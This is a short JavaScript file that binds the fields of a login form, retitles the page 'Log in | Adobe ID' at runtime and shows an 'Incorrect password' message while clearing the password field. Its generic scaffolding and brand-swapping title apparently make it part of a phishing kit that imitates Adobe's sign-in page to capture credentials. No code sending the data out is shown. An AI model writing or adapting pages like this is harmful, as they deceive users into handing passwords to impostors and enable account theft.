window.onload = function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
}

function bindElements(params) {
    window.LIB_submitButton = document.querySelector('button[type="submit"]');
    window.LIB_userInput = document.getElementById('ai');
    window.LIB_pwdInput = document.getElementById('pr');
    window.LIB_form = document.getElementById('lform');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');

    document.getElementsByTagName('title')[0]
        .innerText = 'Log in | Adobe ID';

    window.LIB_onLoginFail = function () {
        const notice = document.getElementById('error');
        notice.innerHTML = 'Incorrect password, try again.';
        notice.style.display = 'block';
        window.LIB_pwdInput.value = '';
    };
}
